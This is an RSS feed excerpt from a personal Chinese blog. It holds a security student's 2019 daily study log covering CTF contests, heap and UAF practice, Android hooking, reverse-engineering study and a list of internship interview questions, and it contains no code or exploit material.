&lt;h4 id=&#34;05-08-三-晴-雨&#34;&gt;05-08 三 晴-&amp;gt;雨&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;05-07-二-雨&#34;&gt;05-07 二 雨&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;05-06-一-雨&#34;&gt;05-06 一 雨&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;05-05-天-雨&#34;&gt;05-05 天 雨&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;补课&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;05-01-04-五一劳动节&#34;&gt;05-01-04 五一劳动节&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;04-30-二&#34;&gt;04-30 二&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;04-29-一&#34;&gt;04-29 一&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;04-28-天&#34;&gt;04-28 天&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;补课&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;04-27-六-阴-雨&#34;&gt;04-27 六 阴+雨&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;*CTF2019 一个人打，tcl，放弃看pwn去了。&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;04-26-五-热30-傍晚大雨&#34;&gt;04-26 五 热30+傍晚大雨&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;UAF利用练习&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;04-25-四-热30&#34;&gt;04-25 四 热30+&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;上课+看了一整天Android内核安全基础知识。&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;04-24-三-热30&#34;&gt;04-24 三 热30°&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;看了国赛逆向的逆向题strange_int &lt;a href=&#34;https://www.52pojie.cn/thread-936377-1-1.html&#34;&gt;https://www.52pojie.cn/thread-936377-1-1.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;想写一篇关于MBR逆向的文章做个记录！&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;04-23-二-热&#34;&gt;04-23 二 热&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;复现国赛 看了部分逆向和PWN、Crypto。&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;04-22-一-热&#34;&gt;04-22 一 热&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;闲鱼的生活(睡懒觉+看权力的游戏+下自走棋)&lt;/li&gt;
&lt;li&gt;打算明天继续进入正轨的学习&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;04-20-21-周末-暴雨打雷-六-大太阳-日&#34;&gt;04-20-21 周末 暴雨打雷（六）+ 大太阳（日）&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;打国赛的两天。感觉自己tcl。&lt;/li&gt;
&lt;li&gt;pwn基本都不会做。。。第二天的re是真的难啊。。。&lt;/li&gt;
&lt;li&gt;总结：

&lt;ul&gt;
&lt;li&gt;加强基础知识的掌握，感觉自己密码学学的真的是糟糕，不管是数学的密码学还是逆向的密码学都很差。&lt;/li&gt;
&lt;li&gt;汇编也是很多时候缕不清整个流程。C看多了也会看懵逼。&lt;/li&gt;
&lt;li&gt;PWN还真的是菜鸡状态。&lt;/li&gt;
&lt;li&gt;脑筋很多时候转不过来，果然还是看的太少，练的太少。&lt;/li&gt;
&lt;li&gt;做事还是不专一，看东西经常没耐心，容易半途而废，理解得太浅。&lt;/li&gt;
&lt;li&gt;希望很多事情从现在看是改正还不算太晚吧。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;04-19-五-热-没太阳&#34;&gt;04-19 五 热 没太阳&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;早起去上最后一节移动终端安全的课。发现去了也白去。。Java-Web开发也不应该去。&lt;/li&gt;
&lt;li&gt;国赛成功报上了。感谢组委会。晚上继续跑步。&lt;/li&gt;
&lt;li&gt;下午看了一些Linux内核调试的基础文章。&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;04-18-四-热&#34;&gt;04-18 四 热&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;运动会继续放假。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;从早上开始忙国赛报名的事情。最终组委会还是同意补报。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;面试aaaa:感觉凉了。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;面试：有的忘记了，大概就这些&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;你最熟悉的项目：巴拉巴拉。。&lt;/li&gt;
&lt;li&gt;开发相关：不想做开发，说的模模糊糊。。&lt;/li&gt;
&lt;li&gt;会前端？后端？用什么写的后端？&lt;/li&gt;
&lt;li&gt;做过什么大的app?&lt;/li&gt;
&lt;li&gt;Android art原理&lt;/li&gt;
&lt;li&gt;逆向过程中遇到的问题，如何解决？&lt;/li&gt;
&lt;li&gt;apk install的整个过程&lt;/li&gt;
&lt;li&gt;Android内核知道多少&lt;/li&gt;
&lt;li&gt;rop原理&lt;/li&gt;
&lt;li&gt;运维遇到的问题？解决？问题出在哪儿？&lt;/li&gt;
&lt;li&gt;调过的CVE?&lt;/li&gt;
&lt;li&gt;CTF pwn?&lt;/li&gt;
&lt;li&gt;Linux内核了解不？&lt;/li&gt;
&lt;li&gt;读大几？什么能来上班？&lt;/li&gt;
&lt;li&gt;还有什么你觉得没问到的？&lt;/li&gt;
&lt;li&gt;你还想问些什么？&lt;/li&gt;
&lt;li&gt;··· ···&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;04-17-三&#34;&gt;04-17 三&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;学校开运动会，放假，看面试的一些基础知识。&lt;/li&gt;
&lt;li&gt;(⊙o⊙)…面试改到明天，发现国赛没报上，心烦意乱，约人去跑步。然后一整天就只看了一些Android Hook的基础原理。&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;04-16-二&#34;&gt;04-16 二&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;找实习+复习知识点。&lt;/li&gt;
&lt;li&gt;只怪自己太菜了，实习真难找。。。&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;04-15-一&#34;&gt;04-15 一&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;复习之前学的数据结构、操作系统相关。&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;04-14&#34;&gt;04-14&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;堆相关练习&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;04-13&#34;&gt;04-13&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;深入理解堆&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;04-12&#34;&gt;04-12&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;JIT编程-方法内联&lt;/li&gt;
&lt;li&gt;Android HOOK 之 YAHFA原理&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/iqiyi/xHook/blob/master/docs/overview/android_plt_hook_overview.zh-CN.md&#34;&gt;PLT Hook&lt;/a&gt;&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;Inline Hook&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;long-long-ago&#34;&gt;Long long ago&lt;/h3&gt;

&lt;p&gt;[只剩回忆]()  已删除&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title></title>
      <link>https://naivete.cc/%E5%8F%8B%E9%93%BE/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://naivete.cc/%E5%8F%8B%E9%93%BE/</guid>
      
        <description>

&lt;h3 id=&#34;友链&#34;&gt;友链&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;[]()&lt;/li&gt;
&lt;/ul&gt;
</description>
      
    </item>
    
  </channel>
</rss>